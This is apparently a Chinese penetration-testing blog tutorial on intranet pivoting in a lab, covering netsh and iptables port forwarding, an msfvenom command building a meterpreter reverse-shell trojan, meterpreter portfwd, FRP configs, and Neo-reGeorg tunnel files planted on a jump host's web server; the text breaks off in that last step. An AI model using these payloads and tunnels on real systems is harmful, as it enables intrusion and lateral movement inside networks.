{"title":"内网穿透","uid":"6f6e74f284af1d44cd531a6b40059037","slug":"内网穿透","date":"2022-08-28T07:51:03.000Z","updated":"2022-08-28T12:58:26.334Z","comments":true,"path":"api/articles/内网穿透.json","keywords":null,"cover":"https://img0.baidu.com/it/u=114685654,302008310&fm=253&fmt=auto&app=138&f=JPG?w=804&h=350","content":"<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>​\t\t内网穿透，也即 NAT 穿透，进行 NAT 穿透是为了使具有某一个特定源 IP 地址和源端口号的数据包不被 NAT 设备屏蔽而正确路由到内网主机。</p></blockquote>\n<h2 id=\"一、端口转发\"><a href=\"#一、端口转发\" class=\"headerlink\" title=\"一、端口转发\"></a>一、端口转发</h2><h3 id=\"壹、-netsh端口转发\"><a href=\"#壹、-netsh端口转发\" class=\"headerlink\" title=\"壹、 netsh端口转发\"></a>壹、 netsh端口转发</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>​\t\t通过利用本客户机端口映射到服务器端口来工作。多数情况下，这一过程对连接的两端而言都是透明的。大多数的防火墙只能进行端口转发，而端口转发的一个特点就是“一对一”，不能复用。</p></blockquote>\n<h4 id=\"1-环境准备\"><a href=\"#1-环境准备\" class=\"headerlink\" title=\"1. 环境准备\"></a>1. 环境准备</h4><p>​\t\t  Centos7（目标机）：192.168.2.5</p>\n<p>​\t\t  Windows11（跳板机1）：192.168.2.7</p>\n<p>​\t\t  Debian（跳板机2）：192.168.2.8</p>\n<p>​\t\t  Centos6（跳板机）：120.48.33.217</p>\n<p>​\t\t  Kali（攻击机）：192.168.2.14</p>\n<p>由于PD虚拟机环境无法配置双网卡，为了模拟Kali与Centos7处于不同网段之间无法通信，在Centos7上封锁Kali的IP</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">iptables -I INPUT -s <span class=\"token number\">192.168</span>.2.14 -j DROP\n\n<span class=\"token comment\"># 确认无法连通</span>\n┌──<span class=\"token punctuation\">(</span>root㉿kali-linux-2022-2<span class=\"token punctuation\">)</span>-<span class=\"token punctuation\">[</span>/home/kali<span class=\"token punctuation\">]</span>\n└─<span class=\"token comment\"># ping 192.168.2.5 -W 5 -c 1                                                               </span>\nPING <span class=\"token number\">192.168</span>.2.5 <span class=\"token punctuation\">(</span><span class=\"token number\">192.168</span>.2.5<span class=\"token punctuation\">)</span> <span class=\"token number\">56</span><span class=\"token punctuation\">(</span><span class=\"token number\">84</span><span class=\"token punctuation\">)</span> bytes of data.\n\n--- <span class=\"token number\">192.168</span>.2.5 <span class=\"token function\">ping</span> statistics ---\n<span class=\"token number\">1</span> packets transmitted, <span class=\"token number\">0</span> received, <span class=\"token number\">100</span>% packet loss, <span class=\"token function\">time</span> 0ms\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"2-配置端口转发\"><a href=\"#2-配置端口转发\" class=\"headerlink\" title=\"2. 配置端口转发\"></a>2. 配置端口转发</h4><p>（1）在目标机上启动http服务以便于测试端口转发是否成功</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">systemctl start httpd\n\nhttp://192.168.2.5/1.html  <span class=\"token comment\"># hello</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>（2）在跳板机上运行命令，进行端口转发</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">netsh interface portproxy <span class=\"token function\">add</span> v4tov4 <span class=\"token assign-left variable\">listenport</span><span class=\"token operator\">=</span><span class=\"token number\">8888</span> <span class=\"token assign-left variable\">connectaddress</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.2.5 <span class=\"token assign-left variable\">connectport</span><span class=\"token operator\">=</span><span class=\"token number\">80</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>（3）测试是否成功</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">┌──<span class=\"token punctuation\">(</span>root㉿kali-linux-2022-2<span class=\"token punctuation\">)</span>-<span class=\"token punctuation\">[</span>/home/kali<span class=\"token punctuation\">]</span>\n└─<span class=\"token comment\"># curl http://192.168.2.7:8888/1.html</span>\nhello<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>（4）netsh其他命令</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">netsh interface portproxy show all    <span class=\"token comment\"># 查看转发规则</span>\nnetsh interface portproxy reset\t\t\t\t<span class=\"token comment\"># 重置转发规则</span>\nnetsh interface portproxy delete v4tov4 <span class=\"token assign-left variable\">listenport</span><span class=\"token operator\">=</span><span class=\"token number\">8888</span>\t\t<span class=\"token comment\"># 清除转发</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>（5）Linux端口转发</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 临时开启内核转发</span>\nsysctl -w net.ipv4.ip_forward<span class=\"token operator\">=</span><span class=\"token number\">1</span>\t\n\n<span class=\"token comment\">#   将本机192.168.2.8:8888端口的数据转发到192.168.2.5:80</span>\n<span class=\"token comment\">##  iptables转发</span>\niptables -t nat -A PREROUTING -d <span class=\"token number\">192.168</span>.2.8 -p tcp --dport <span class=\"token number\">8888</span> -j DNAT --to-destination <span class=\"token number\">192.168</span>.2.5:80\n\n<span class=\"token comment\">##  firewall转发</span>\nfirewall-cmd --add-masquerade    <span class=\"token comment\"># 允许防火墙伪装IP</span>\nfirewall-cmd --add-forward-post<span class=\"token operator\">=</span>post<span class=\"token operator\">=</span><span class=\"token number\">8888</span>:proto<span class=\"token operator\">=</span>tcp:toaddr<span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.2.5:toport<span class=\"token operator\">=</span><span class=\"token number\">80</span>\t<span class=\"token comment\">#端口转发</span>\nfirewall-cmd --reload\t\t<span class=\"token comment\"># 重载规则</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"貳、MSF端口转发\"><a href=\"#貳、MSF端口转发\" class=\"headerlink\" title=\"貳、MSF端口转发\"></a>貳、MSF端口转发</h3><h4 id=\"1-生成木马\"><a href=\"#1-生成木马\" class=\"headerlink\" title=\"1. 生成木马\"></a>1. 生成木马</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p windows/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.2.14 <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">4444</span> -f exe <span class=\"token operator\">></span> shell.exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h4 id=\"2-配置端口转发-1\"><a href=\"#2-配置端口转发-1\" class=\"headerlink\" title=\"2. 配置端口转发\"></a>2. 配置端口转发</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 将本地8888端口转发到192.168.2.5:80</span>\nmeterpreter <span class=\"token operator\">></span> portfwd <span class=\"token function\">add</span> -l <span class=\"token number\">8888</span> -r <span class=\"token number\">192.168</span>.2.5 -p <span class=\"token number\">80</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"3-访问本地端口\"><a href=\"#3-访问本地端口\" class=\"headerlink\" title=\"3. 访问本地端口\"></a>3. 访问本地端口</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">┌──<span class=\"token punctuation\">(</span>root㉿kali-linux-2022-2<span class=\"token punctuation\">)</span>-<span class=\"token punctuation\">[</span>~<span class=\"token punctuation\">]</span>\n└─<span class=\"token comment\"># curl http://127.0.0.1:8888/1.html</span>\nhello<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"二、端口映射\"><a href=\"#二、端口映射\" class=\"headerlink\" title=\"二、端口映射\"></a>二、端口映射</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>​\t\t端口映射:端口映射是指将内网主机的端口映射到外网主机的端口，以提供相应的服务。当用户访问外部网络IP的这个端口时，服务器自动将请求映射到相应局域网中的机器。</p></blockquote>\n<h3 id=\"壹、FRP端口映射\"><a href=\"#壹、FRP端口映射\" class=\"headerlink\" title=\"壹、FRP端口映射\"></a>壹、FRP端口映射</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>frp 是一个开源、简洁易用、高性能的内网穿透和反向代理软件，支持 tcp, udp, http, https等协议。</p>\n<p>下载地址：<a href=\"https://github.com/fatedier/frp\">https://github.com/fatedier/frp</a></p></blockquote>\n<h4 id=\"1-SSH-服务\"><a href=\"#1-SSH-服务\" class=\"headerlink\" title=\"1. SSH 服务\"></a>1. SSH 服务</h4><p>（1）在公网服务器上配置frps.ini</p>\n<pre class=\"line-numbers language-ini\" data-language=\"ini\"><code class=\"language-ini\"><span class=\"token section\"><span class=\"token punctuation\">[</span><span class=\"token section-name selector\">common</span><span class=\"token punctuation\">]</span></span>\n<span class=\"token key attr-name\">bind_port</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">7000 \t\t# 服务端端口</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>（2）启动</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">./frps -c ./frps.ini\t\t\t\t\t\t<span class=\"token comment\"># 常规启动</span>\n<span class=\"token function\">nohup</span> ./frps -c ./frps.ini <span class=\"token operator\">&amp;</span>\t\t<span class=\"token comment\"># 后台启动</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>（3）配置内网客户端frpc.ini</p>\n<pre class=\"line-numbers language-ini\" data-language=\"ini\"><code class=\"language-ini\"><span class=\"token section\"><span class=\"token punctuation\">[</span><span class=\"token section-name selector\">common</span><span class=\"token punctuation\">]</span></span>\n<span class=\"token key attr-name\">server_addr</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">120.48.33.217\t\t# frp服务端地址，可以填写IP或域名</span>\n<span class=\"token key attr-name\">server_port</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">7000\t\t\t\t\t\t# frp服务端端口，需要与frps.ini中的bind_port一致</span>\n\n<span class=\"token section\"><span class=\"token punctuation\">[</span><span class=\"token section-name selector\">ssh</span><span class=\"token punctuation\">]</span></span>\n<span class=\"token key attr-name\">type</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">tcp\t\t\t\t\t\t\t\t\t\t# 连接类型，tcp或upd</span>\n<span class=\"token key attr-name\">local_ip</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">127.0.0.1\t\t\t\t\t# 内网IP</span>\n<span class=\"token key attr-name\">local_port</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">22\t\t\t\t\t\t\t\t# 需要转发的端口</span>\n<span class=\"token key attr-name\">remote_port</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">8888\t\t\t\t\t\t# frp服务端远程监听端口，即访问公网IP的remote_port === 内网IP的local_port</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在任意公网主机上通过：<strong>ssh <a href=\"mailto:&#114;&#x6f;&#x6f;&#116;&#x40;&#49;&#48;&#50;&#x30;&#x2e;&#x34;&#56;&#46;&#51;&#x33;&#x2e;&#x32;&#x31;&#55;\">&#114;&#x6f;&#x6f;&#116;&#x40;&#49;&#48;&#50;&#x30;&#x2e;&#x34;&#56;&#46;&#51;&#x33;&#x2e;&#x32;&#x31;&#55;</a> -p 8888</strong> 可访问到内网主机</p>\n<h4 id=\"2-HTTP-服务\"><a href=\"#2-HTTP-服务\" class=\"headerlink\" title=\"2. HTTP 服务\"></a>2. HTTP 服务</h4><p>（1）在公网服务器上配置frps.ini</p>\n<pre class=\"line-numbers language-ini\" data-language=\"ini\"><code class=\"language-ini\"><span class=\"token section\"><span class=\"token punctuation\">[</span><span class=\"token section-name selector\">common</span><span class=\"token punctuation\">]</span></span>\n<span class=\"token key attr-name\">bind_port</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">7000 \t\t# 服务端端口</span>\n<span class=\"token key attr-name\">vhost_http_port</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">8080</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p> （2）启动</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">./frps -c ./frps.ini\t\t\t\t\t<span class=\"token comment\"># 常规启动</span>\n<span class=\"token function\">nohup</span> ./frps -c ./frps.ini\t\t<span class=\"token comment\"># 后台启动</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>（3）配置内网客户端frpc.ini</p>\n<pre class=\"line-numbers language-ini\" data-language=\"ini\"><code class=\"language-ini\"><span class=\"token section\"><span class=\"token punctuation\">[</span><span class=\"token section-name selector\">common</span><span class=\"token punctuation\">]</span></span>\n<span class=\"token key attr-name\">server_addr</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">120.48.33.217\t\t# frp服务端地址，可以填写IP或域名</span>\n<span class=\"token key attr-name\">server_port</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">7000\t\t\t\t\t\t# frp服务端端口，需要与frps.ini中的bind_port一致</span>\n\n<span class=\"token section\"><span class=\"token punctuation\">[</span><span class=\"token section-name selector\">web</span><span class=\"token punctuation\">]</span></span>\n<span class=\"token key attr-name\">type</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">http\t\t\t\t\t\t\t\t\t\t# 连接类型</span>\n<span class=\"token key attr-name\">local_port</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">22\t\t\t\t\t\t\t\t# 需要转发的端口</span>\n<span class=\"token key attr-name\">custom_domains</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">[域名]\t\t\t\t # 域名</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"3-开启Dashboard\"><a href=\"#3-开启Dashboard\" class=\"headerlink\" title=\"3. 开启Dashboard\"></a>3. 开启Dashboard</h4><p>（1）配置服务端frps.ini</p>\n<pre class=\"line-numbers language-ini\" data-language=\"ini\"><code class=\"language-ini\"><span class=\"token section\"><span class=\"token punctuation\">[</span><span class=\"token section-name selector\">common</span><span class=\"token punctuation\">]</span></span>\n<span class=\"token key attr-name\">bind_port</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">7000 \t\t# 服务端端口</span>\n<span class=\"token key attr-name\">vhost_http_port</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">8080</span>\n\n<span class=\"token comment\"># 开启仪表盘</span>\n<span class=\"token key attr-name\">dashboard_addr</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">0.0.0.0  # 允许任何IP访问</span>\n<span class=\"token key attr-name\">dashboard_post</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">8081</span>\n<span class=\"token key attr-name\">dashboard_user</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">root</span>\n<span class=\"token key attr-name\">dashboard_pwd</span>  <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">root</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"三、隧道\"><a href=\"#三、隧道\" class=\"headerlink\" title=\"三、隧道\"></a>三、隧道</h2><h3 id=\"壹、Neo-reGorg\"><a href=\"#壹、Neo-reGorg\" class=\"headerlink\" title=\"壹、Neo-reGorg\"></a>壹、Neo-reGorg</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>​\t\tNeo-reGeorg是常见的http正向隧道工具，是reGeorg工具的升级版。增加了很多特性，例如像内容<a href=\"https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020\">加密</a>、避免被检测、请求头定制、响应码定制、支持py3等等</p>\n<p>下载地址：<a href=\"https://github.com/L-codes/Neo-reGeorg\">https://github.com/L-codes/Neo-reGeorg</a></p></blockquote>\n<h4 id=\"1-生成隧道文件\"><a href=\"#1-生成隧道文件\" class=\"headerlink\" title=\"1. 生成隧道文件\"></a>1. 生成隧道文件</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">python3 neoreg.py generate -k <span class=\"token number\">123456</span>\n\n<span class=\"token comment\"># 生成效果</span>\n<span class=\"token punctuation\">[</span> Github <span class=\"token punctuation\">]</span> https://github.com/L-codes/Neo-reGeorg\n\n<span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> Mkdir a directory: neoreg_servers\n<span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> Create neoreg server files:\n<span class=\"token operator\">=</span><span class=\"token operator\">></span> neoreg_servers/tunnel.jsp\n<span class=\"token operator\">=</span><span class=\"token operator\">></span> neoreg_servers/tunnel_compatibility.jsp\n<span class=\"token operator\">=</span><span class=\"token operator\">></span> neoreg_servers/tunnel.ashx\n<span class=\"token operator\">=</span><span class=\"token operator\">></span> neoreg_servers/tunnel.jspx\n<span class=\"token operator\">=</span><span class=\"token operator\">></span> neoreg_servers/tunnel_compatibility.jspx\n<span class=\"token operator\">=</span><span class=\"token operator\">></span> neoreg_servers/tunnel.aspx\n<span class=\"token operator\">=</span><span class=\"token operator\">></span> neoreg_servers/tunnel.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"2-植入文件\"><a href=\"#2-植入文件\" class=\"headerlink\" title=\"2. 植入文件\"></a>2. 植入文件</h4><p>根据跳板服务类型，将tunnel.php放入在windows跳板机的WEB服务器目录下</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">C:<span class=\"token 